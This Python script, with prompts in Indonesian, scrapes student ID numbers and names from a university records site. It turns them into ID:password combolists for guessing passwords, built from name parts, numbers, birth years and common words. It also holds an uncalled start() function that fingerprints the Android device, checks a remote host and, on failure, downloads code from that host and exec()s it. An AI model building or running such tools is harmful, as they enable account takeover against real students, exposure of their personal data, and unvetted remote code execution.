import requests as req
import os, json, hashlib, sys
from bs4 import BeautifulSoup as bs
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()

grey = '\x1b[90m'
red = '\x1b[91m'
green = '\x1b[92m'
yellow = '\x1b[93m'
blue = '\x1b[94m'
purple = '\x1b[95m'
cyan = '\x1b[96m'
white = '\x1b[37m'
flag = '\x1b[41;39m'
bold = '\033[1m'
normal = '\033[0m'
off = '\x1b[m'

bn = (f"{red}   ________  ___  __   ___   ___ \n{yellow}  / __/ __ \/ _ \/ /  / _ | / _ \{green}\n / _// /_/ / , _/ /__/ __ |/ ___/\n{cyan}/_/  \____/_/|_/____/_/ |_/_/    ")                   

'''
 
 DO NOT RESELL FOR RESPECT
 MAKING THIS TOOL IS VERY DIFFICULT
 
'''

yxc = []
def main():
	os.system('clear')
	print(bn)
	print(f"{flag}      RANIA SALSABILLA      {off}")
	print()
	print(f"{grey}[{red}1{grey}]{off}{cyan}NIM:NAMAALL\n{grey}[{red}2{grey}]{off}{cyan}Nim:NamaKecil \n")
	_0 = input(f"{grey}[{red}?{grey}]{white}Pilih > ")
	_1 = cut(input(f"\n{red}[{yellow}!{red}]{off}Ambil link dari tahun Smester\n\n{off}[{green}+{off}]{green}Input Link {off}> "))
	print()
	_2 = input(f"{off}[{green}+{off}]{green}Nama Output (nama + .txt) {off}> ")
	_3 = stat(_1)
	if _0 == '#':
		print(f'\n [!] Total halaman: {_3}\n')
		for _ in range(int(_3)):
			print(f'> Grabbing page {_+1}')
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			with open(_2,'a') as o_:
				o_.write(__+'\n')
		done(_2)
	elif _0 == '@':
		print(f'\n [!] Total halaman: {_3}\n')
		for _ in range(int(_3)):
			print(f'> Grabbing page {_+1}')
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			with open(_2,'a') as o_:
				o_.write(__+':'+__+'\n')
		done(_2)
	elif _0 == '1':
		print(f'\n{green}[{white}✓{green}]{white}Total halaman : {green}{_3}{off}\n')
		for _ in range(int(_3)):
			print(f"{cyan}>> {yellow}Grabbing page ke {white}: {_+1}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			___ = json.loads(json.dumps(yxc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					o_.write(__+':'+x[0].title()+'\n')
					o_.write(__+':'+x[1].title()+'\n')
					o_.write(__+':'+x[2].title()+'\n')
					o_.write(__+':'+x[0].title()+'01\n')
					o_.write(__+':'+x[0].title()+'02\n')
					o_.write(__+':'+x[0].title()+'03\n')
					o_.write(__+':'+x[0].title()+'04\n')
					o_.write(__+':'+x[0].title()+'05\n')
					o_.write(__+':'+x[0].title()+'06\n')
					o_.write(__+':'+x[0].title()+'07\n')
					o_.write(__+':'+x[0].title()+'08\n')
					o_.write(__+':'+x[0].title()+'09\n')
					o_.write(__+':'+x[0].title()+'10\n')
					o_.write(__+':'+x[0].title()+'11\n')
					o_.write(__+':'+x[0].title()+'12\n')
					o_.write(__+':'+x[0].title()+'13\n')
					o_.write(__+':'+x[0].title()+'14\n')
					o_.write(__+':'+x[0].title()+'15\n')
					o_.write(__+':'+x[0].title()+'16\n')
					o_.write(__+':'+x[0].title()+'17\n')
					o_.write(__+':'+x[0].title()+'18\n')
					o_.write(__+':'+x[0].title()+'19\n')
					o_.write(__+':'+x[0].title()+'20\n')
					o_.write(__+':'+x[0].title()+'21\n')
					o_.write(__+':'+x[0].title()+'22\n')
					o_.write(__+':'+x[0].title()+'23\n')
					o_.write(__+':'+x[0].title()+'24\n')
					o_.write(__+':'+x[0].title()+'25\n')
					o_.write(__+':'+x[0].title()+'26\n')
					o_.write(__+':'+x[0].title()+'27\n')
					o_.write(__+':'+x[0].title()+'28\n')
					o_.write(__+':'+x[0].title()+'29\n')
					o_.write(__+':'+x[0].title()+'30\n')
					o_.write(__+':'+x[1].title()+'01\n')
					o_.write(__+':'+x[1].title()+'02\n')
					o_.write(__+':'+x[1].title()+'03\n')
					o_.write(__+':'+x[1].title()+'04\n')
					o_.write(__+':'+x[1].title()+'05\n')
					o_.write(__+':'+x[1].title()+'06\n')
					o_.write(__+':'+x[1].title()+'07\n')
					o_.write(__+':'+x[1].title()+'08\n')
					o_.write(__+':'+x[1].title()+'09\n')
					o_.write(__+':'+x[1].title()+'10\n')
					o_.write(__+':'+x[1].title()+'11\n')
					o_.write(__+':'+x[1].title()+'12\n')
					o_.write(__+':'+x[1].title()+'13\n')
					o_.write(__+':'+x[1].title()+'14\n')
					o_.write(__+':'+x[1].title()+'15\n')
					o_.write(__+':'+x[1].title()+'16\n')
					o_.write(__+':'+x[1].title()+'17\n')
					o_.write(__+':'+x[1].title()+'18\n')
					o_.write(__+':'+x[1].lower()+'19\n')
					o_.write(__+':'+x[1].title()+'20\n')
					o_.write(__+':'+x[1].title()+'21\n')
					o_.write(__+':'+x[1].title()+'22\n')
					o_.write(__+':'+x[1].title()+'23\n')
					o_.write(__+':'+x[1].title()+'24\n')
					o_.write(__+':'+x[1].title()+'25\n')
					o_.write(__+':'+x[1].title()+'26\n')
					o_.write(__+':'+x[1].title()+'27\n')
					o_.write(__+':'+x[1].title()+'28\n')
					o_.write(__+':'+x[1].title()+'29\n')
					o_.write(__+':'+x[1].title()+'30\n')
					o_.write(__+':'+x[2].title()+'01\n')
					o_.write(__+':'+x[2].title()+'02\n')
					o_.write(__+':'+x[2].title()+'03\n')
					o_.write(__+':'+x[2].title()+'04\n')
					o_.write(__+':'+x[2].title()+'05\n')
					o_.write(__+':'+x[2].title()+'06\n')
					o_.write(__+':'+x[2].title()+'07\n')
					o_.write(__+':'+x[2].title()+'08\n')
					o_.write(__+':'+x[2].title()+'09\n')
					o_.write(__+':'+x[2].title()+'10\n')
					o_.write(__+':'+x[2].title()+'11\n')
					o_.write(__+':'+x[2].title()+'12\n')
					o_.write(__+':'+x[2].title()+'13\n')
					o_.write(__+':'+x[2].title()+'14\n')
					o_.write(__+':'+x[2].title()+'15\n')
					o_.write(__+':'+x[2].title()+'16\n')
					o_.write(__+':'+x[2].title()+'17\n')
					o_.write(__+':'+x[2].title()+'18\n')
					o_.write(__+':'+x[2].title()+'19\n')
					o_.write(__+':'+x[2].title()+'20\n')
					o_.write(__+':'+x[2].title()+'21\n')
					o_.write(__+':'+x[2].title()+'22\n')
					o_.write(__+':'+x[2].title()+'23\n')
					o_.write(__+':'+x[2].title()+'24\n')
					o_.write(__+':'+x[2].title()+'25\n')
					o_.write(__+':'+x[2].title()+'26\n')
					o_.write(__+':'+x[2].title()+'27\n')
					o_.write(__+':'+x[2].title()+'28\n')
					o_.write(__+':'+x[2].title()+'29\n')
					o_.write(__+':'+x[2].title()+'30\n')
					o_.write(__+':'+x[0].title()+'1\n')
					o_.write(__+':'+x[0].title()+'12\n')
					o_.write(__+':'+x[0].title()+'123\n')
					o_.write(__+':'+x[0].title()+'1234\n')
					o_.write(__+':'+x[0].title()+'12345\n')
					o_.write(__+':'+x[1].title()+'1\n')
					o_.write(__+':'+x[1].title()+'12\n')
					o_.write(__+':'+x[1].title()+'123\n')
					o_.write(__+':'+x[1].title()+'1234\n')
					o_.write(__+':'+x[1].title()+'12345\n')
					o_.write(__+':'+x[2].title()+'1\n')
					o_.write(__+':'+x[2].title()+'12\n')
					o_.write(__+':'+x[2].title()+'123\n')
					o_.write(__+':'+x[2].title()+'1234\n')
					o_.write(__+':'+x[2].title()+'12345\n')
					o_.write(__+':'+x[0].title()+'1\n')
					o_.write(__+':'+x[0].title()+'21\n')
					o_.write(__+':'+x[0].title()+'321\n')
					o_.write(__+':'+x[0].title()+'4321\n')
					o_.write(__+':'+x[0].title()+'54321\n')
					o_.write(__+':'+x[1].title()+'1\n')
					o_.write(__+':'+x[1].title()+'21\n')
					o_.write(__+':'+x[1].title()+'321\n')
					o_.write(__+':'+x[1].title()+'4321\n')
					o_.write(__+':'+x[1].title()+'54321\n')
					o_.write(__+':'+x[2].title()+'1\n')
					o_.write(__+':'+x[2].title()+'21\n')
					o_.write(__+':'+x[2].title()+'321\n')
					o_.write(__+':'+x[2].title()+'4321\n')
					o_.write(__+':'+x[2].title()+'54321\n')
					o_.write(__+':'+x[0].title()+'1998\n')
					o_.write(__+':'+x[0].title()+'1999\n')
					o_.write(__+':'+x[0].title()+'2000\n')
					o_.write(__+':'+x[0].title()+'2001\n')
					o_.write(__+':'+x[0].title()+'2002\n')
					o_.write(__+':'+x[0].title()+'2003\n')
					o_.write(__+':'+x[1].title()+'1998\n')
					o_.write(__+':'+x[1].title()+'1999\n')
					o_.write(__+':'+x[1].title()+'2000\n')
					o_.write(__+':'+x[1].title()+'2001\n')
					o_.write(__+':'+x[1].title()+'2002\n')
					o_.write(__+':'+x[1].title()+'2003\n')
					o_.write(__+':'+x[2].title()+'1998\n')
					o_.write(__+':'+x[2].title()+'1999\n')
					o_.write(__+':'+x[2].title()+'2000\n')
					o_.write(__+':'+x[2].title()+'2001\n')
					o_.write(__+':'+x[2].title()+'2002\n')
					o_.write(__+':'+x[2].title()+'2003\n')
					o_.write(__+':'+'Bismillah\n')
					o_.write(__+':'+'Bismillah1\n')
					o_.write(__+':'+'Bismillah12\n')
					o_.write(__+':'+'Bismillah123\n')
					o_.write(__+':'+'Bismillah1234\n')
					o_.write(__+':'+'Bismillah12345\n')
					o_.write(__+':'+'Indonesia\n')
					o_.write(__+':'+'Indonesia1\n')
					o_.write(__+':'+'Indonesia12\n')
					o_.write(__+':'+'Indonesia123\n')
					o_.write(__+':'+'Indonesia1945\n')
					o_.write(__+':'+'Alhamdulilah\n')
					o_.write(__+':'+'Surabaya\n')
					o_.write(__+':'+'Surabaya1\n')
					o_.write(__+':'+'Surabaya12\n')
					o_.write(__+':'+'Surabaya123\n')
					o_.write(__+':'+'Bandung\n')
					o_.write(__+':'+'Bandung1\n')
					o_.write(__+':'+'Bandung12\n')
					o_.write(__+':'+'Bandung123\n')
			except:
				with open(_2,'a') as o_:
					o_.write(__+':'+___.title()+'\n')
		done(_2)
	elif _0 == '2':
		print(f'\n{green}[{white}✓{green}]{white}Total halaman : {green}{_3}{off}\n')
		for _ in range(int(_3)):
			print(f"{cyan}>> {yellow}Grabbing page ke {white}: {_+1}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			___ = json.loads(json.dumps(yxc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					o_.write(__+':'+x[0].lower()+'\n')
					o_.write(__+':'+x[1].lower()+'\n')
					o_.write(__+':'+x[2].lower()+'\n')
					o_.write(__+':'+x[0].lower()+'01\n')
					o_.write(__+':'+x[0].lower()+'02\n')
					o_.write(__+':'+x[0].lower()+'03\n')
					o_.write(__+':'+x[0].lower()+'04\n')
					o_.write(__+':'+x[0].lower()+'05\n')
					o_.write(__+':'+x[0].lower()+'06\n')
					o_.write(__+':'+x[0].lower()+'07\n')
					o_.write(__+':'+x[0].lower()+'08\n')
					o_.write(__+':'+x[0].lower()+'09\n')
					o_.write(__+':'+x[0].lower()+'10\n')
					o_.write(__+':'+x[0].lower()+'11\n')
					o_.write(__+':'+x[0].lower()+'12\n')
					o_.write(__+':'+x[0].lower()+'13\n')
					o_.write(__+':'+x[0].lower()+'14\n')
					o_.write(__+':'+x[0].lower()+'15\n')
					o_.write(__+':'+x[0].lower()+'16\n')
					o_.write(__+':'+x[0].lower()+'17\n')
					o_.write(__+':'+x[0].lower()+'18\n')
					o_.write(__+':'+x[0].lower()+'19\n')
					o_.write(__+':'+x[0].lower()+'20\n')
					o_.write(__+':'+x[0].lower()+'21\n')
					o_.write(__+':'+x[0].lower()+'22\n')
					o_.write(__+':'+x[0].lower()+'23\n')
					o_.write(__+':'+x[0].lower()+'24\n')
					o_.write(__+':'+x[0].lower()+'25\n')
					o_.write(__+':'+x[0].lower()+'26\n')
					o_.write(__+':'+x[0].lower()+'27\n')
					o_.write(__+':'+x[0].lower()+'28\n')
					o_.write(__+':'+x[0].lower()+'29\n')
					o_.write(__+':'+x[0].lower()+'30\n')
					o_.write(__+':'+x[1].lower()+'01\n')
					o_.write(__+':'+x[1].lower()+'02\n')
					o_.write(__+':'+x[1].lower()+'03\n')
					o_.write(__+':'+x[1].lower()+'04\n')
					o_.write(__+':'+x[1].lower()+'05\n')
					o_.write(__+':'+x[1].lower()+'06\n')
					o_.write(__+':'+x[1].lower()+'07\n')
					o_.write(__+':'+x[1].lower()+'08\n')
					o_.write(__+':'+x[1].lower()+'09\n')
					o_.write(__+':'+x[1].lower()+'10\n')
					o_.write(__+':'+x[1].lower()+'11\n')
					o_.write(__+':'+x[1].lower()+'12\n')
					o_.write(__+':'+x[1].lower()+'13\n')
					o_.write(__+':'+x[1].lower()+'14\n')
					o_.write(__+':'+x[1].lower()+'15\n')
					o_.write(__+':'+x[1].lower()+'16\n')
					o_.write(__+':'+x[1].lower()+'17\n')
					o_.write(__+':'+x[1].lower()+'18\n')
					o_.write(__+':'+x[1].lower()+'19\n')
					o_.write(__+':'+x[1].lower()+'20\n')
					o_.write(__+':'+x[1].lower()+'21\n')
					o_.write(__+':'+x[1].lower()+'22\n')
					o_.write(__+':'+x[1].lower()+'23\n')
					o_.write(__+':'+x[1].lower()+'24\n')
					o_.write(__+':'+x[1].lower()+'25\n')
					o_.write(__+':'+x[1].lower()+'26\n')
					o_.write(__+':'+x[1].lower()+'27\n')
					o_.write(__+':'+x[1].lower()+'28\n')
					o_.write(__+':'+x[1].lower()+'29\n')
					o_.write(__+':'+x[1].lower()+'30\n')
					o_.write(__+':'+x[2].lower()+'01\n')
					o_.write(__+':'+x[2].lower()+'02\n')
					o_.write(__+':'+x[2].lower()+'03\n')
					o_.write(__+':'+x[2].lower()+'04\n')
					o_.write(__+':'+x[2].lower()+'05\n')
					o_.write(__+':'+x[2].lower()+'06\n')
					o_.write(__+':'+x[2].lower()+'07\n')
					o_.write(__+':'+x[2].lower()+'08\n')
					o_.write(__+':'+x[2].lower()+'09\n')
					o_.write(__+':'+x[2].lower()+'10\n')
					o_.write(__+':'+x[2].lower()+'11\n')
					o_.write(__+':'+x[2].lower()+'12\n')
					o_.write(__+':'+x[2].lower()+'13\n')
					o_.write(__+':'+x[2].lower()+'14\n')
					o_.write(__+':'+x[2].lower()+'15\n')
					o_.write(__+':'+x[2].lower()+'16\n')
					o_.write(__+':'+x[2].lower()+'17\n')
					o_.write(__+':'+x[2].lower()+'18\n')
					o_.write(__+':'+x[2].lower()+'19\n')
					o_.write(__+':'+x[2].lower()+'20\n')
					o_.write(__+':'+x[2].lower()+'21\n')
					o_.write(__+':'+x[2].lower()+'22\n')
					o_.write(__+':'+x[2].lower()+'23\n')
					o_.write(__+':'+x[2].lower()+'24\n')
					o_.write(__+':'+x[2].lower()+'25\n')
					o_.write(__+':'+x[2].lower()+'26\n')
					o_.write(__+':'+x[2].lower()+'27\n')
					o_.write(__+':'+x[2].lower()+'28\n')
					o_.write(__+':'+x[2].lower()+'29\n')
					o_.write(__+':'+x[2].lower()+'30\n')
					o_.write(__+':'+x[0].lower()+'1\n')
					o_.write(__+':'+x[0].lower()+'12\n')
					o_.write(__+':'+x[0].lower()+'123\n')
					o_.write(__+':'+x[0].lower()+'1234\n')
					o_.write(__+':'+x[0].lower()+'12345\n')
					o_.write(__+':'+x[1].lower()+'1\n')
					o_.write(__+':'+x[1].lower()+'12\n')
					o_.write(__+':'+x[1].lower()+'123\n')
					o_.write(__+':'+x[1].lower()+'1234\n')
					o_.write(__+':'+x[1].lower()+'12345\n')
					o_.write(__+':'+x[2].lower()+'1\n')
					o_.write(__+':'+x[2].lower()+'12\n')
					o_.write(__+':'+x[2].lower()+'123\n')
					o_.write(__+':'+x[2].lower()+'1234\n')
					o_.write(__+':'+x[2].lower()+'12345\n')
					o_.write(__+':'+x[0].lower()+'1\n')
					o_.write(__+':'+x[0].lower()+'21\n')
					o_.write(__+':'+x[0].lower()+'321\n')
					o_.write(__+':'+x[0].lower()+'4321\n')
					o_.write(__+':'+x[0].lower()+'54321\n')
					o_.write(__+':'+x[1].lower()+'1\n')
					o_.write(__+':'+x[1].lower()+'21\n')
					o_.write(__+':'+x[1].lower()+'321\n')
					o_.write(__+':'+x[1].lower()+'4321\n')
					o_.write(__+':'+x[1].lower()+'54321\n')
					o_.write(__+':'+x[2].lower()+'1\n')
					o_.write(__+':'+x[2].lower()+'21\n')
					o_.write(__+':'+x[2].lower()+'321\n')
					o_.write(__+':'+x[2].lower()+'4321\n')
					o_.write(__+':'+x[2].lower()+'54321\n')
					o_.write(__+':'+x[0].lower()+'1997\n')
					o_.write(__+':'+x[0].lower()+'1998\n')
					o_.write(__+':'+x[0].lower()+'1999\n')
					o_.write(__+':'+x[0].lower()+'2000\n')
					o_.write(__+':'+x[0].lower()+'2001\n')
					o_.write(__+':'+x[0].lower()+'2002\n')
					o_.write(__+':'+x[1].lower()+'1997\n')
					o_.write(__+':'+x[1].lower()+'1998\n')
					o_.write(__+':'+x[1].lower()+'1999\n')
					o_.write(__+':'+x[1].lower()+'2000\n')
					o_.write(__+':'+x[1].lower()+'2001\n')
					o_.write(__+':'+x[1].lower()+'2002\n')
					o_.write(__+':'+x[2].lower()+'1997\n')
					o_.write(__+':'+x[2].lower()+'1998\n')
					o_.write(__+':'+x[2].lower()+'1999\n')
					o_.write(__+':'+x[2].lower()+'2000\n')
					o_.write(__+':'+x[2].lower()+'2001\n')
					o_.write(__+':'+x[2].lower()+'2002\n')
					o_.write(__+':'+'bismillah\n')
					o_.write(__+':'+'bismillah1\n')
					o_.write(__+':'+'bismillah12\n')
					o_.write(__+':'+'bismillah123\n')
					o_.write(__+':'+'bismillah1234\n')
					o_.write(__+':'+'bismillah12345\n')
					o_.write(__+':'+'indonesia\n')
					o_.write(__+':'+'indonesia1\n')
					o_.write(__+':'+'indonesia12\n')
					o_.write(__+':'+'indonesia123\n')
					o_.write(__+':'+'indonesia1945\n')
					o_.write(__+':'+'alhamdulilah\n')
					o_.write(__+':'+'surabaya\n')
					o_.write(__+':'+'surabaya1\n')
					o_.write(__+':'+'surabaya12\n')
					o_.write(__+':'+'surabaya123\n')
					o_.write(__+':'+'bandung1\n')
					o_.write(__+':'+'bandung12\n')
					o_.write(__+':'+'bandung123\n')
			except:
				with open(_2,'a') as o_:
					o_.write(__+':'+___.lower()+'\n')
		done(_2)
	elif _0 == '$':
		print(f'\n [!] Total halaman: {_3}\n')
		for _ in range(int(_3)):
			print(f'> Grabbing page {_+1}')
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			___ = json.loads(json.dumps(yxc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					#o_.write(x[0].title()+':'+__+'\n')
					#o_.write(x[1].title()+':'+__+'\n')
					o_.write(x[0].lower()+':'+ __+'\n')
					o_.write(x[1].lower()+':'+__+'\n')
			except:
				with open(_2,'a') as o_:
					#o_.write(___+':'+__.title()+'\n')
					o_.write(___+':'+__.lower()+'\n')
		done(_2)
	elif _0 == '&':
		print(f'\n [!] Total halaman: {_3}\n')
		for _ in range(int(_3)):
			print(f'> Grabbing page {_+1}')
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			___ = json.loads(json.dumps(yxc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					#o_.write(x[0].title()+':'+x[0].title()+'\n')
					#o_.write(x[1].title()+':'+x[1].title()+'\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'\n')
					o_.write(x[1].lower()+':'+x[1].lower()+'\n')
			except:
				with open(_2,'a') as o_:
					#o_.write(___+':'+___.title()+'\n')
					o_.write(___+':'+___.lower()+'\n')
		done(_2)
	elif _0 == '*':
		print(f'\n [!] Total halaman: {_3}\n')
		for _ in range(int(_3)):
			print(f'> Grabbing page {_+1}')
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			___ = json.loads(json.dumps(yxc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					#o_.write(x[0].title()+':'+x[0].title()+'123\n')
					#o_.write(x[1].title()+':'+x[1].title()+'123\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'123\n')
					o_.write(x[1].lower()+':'+x[1].lower()+'123\n')
			except:
				with open(_2,'a') as o_:
					#o_.write(___+':'+___.title()+'123\n')
					o_.write(___+':'+___.lower()+'123\n')
		done(_2)
	else:
		exit()

def stat(u):
	x = bs(req.get(u,verify=False).text,'html.parser').findAll('div',{'class':'pagination'})[0].findAll('a')[1]['href']
	z = int(x.split('/')[7:][0])//20
	return z

def collect(u):
	raw = bs(req.get(u,verify=False).text,'html.parser').find('table').findAll('tr')
	for i in range(len(raw)-1):
		dat = raw[i+1].findAll('td')
		yxc.append({'nim': dat[1].text.replace(" ",""), 'nama' : dat[2].text})

def cut(x):
	_ = x.split('/')[:7]
	_ = f'{_[0]}/{_[1]}/{_[2]}/{_[3]}/{_[4]}/{_[5]}/{_[6]}/'
	return _

def done(_2):
	print(f"\n{green}[{purple}✓{green}]{cyan}{len(yxc)} {off}Hasil tersimpan di{green} '{_2}'{off}")

def start():
	_ = os.popen('getprop ro.build.id').read().replace('\n','')
	_ = hashlib.md5(_.encode()).hexdigest()[:15]
	o = req.get(f'https://yutixcode.xyz/akses/fdp/{_}',verify=False).status_code
	if o == 200:
		main()
	else:
		o_o = req.get('https://yutixcode.xyz/akses/fdp/fake-anjing.py',verify=False).text
		with open('ewe','w') as crot:
			crot.write(o_o)
		exec(o_o)

if __name__=='__main__':
	main()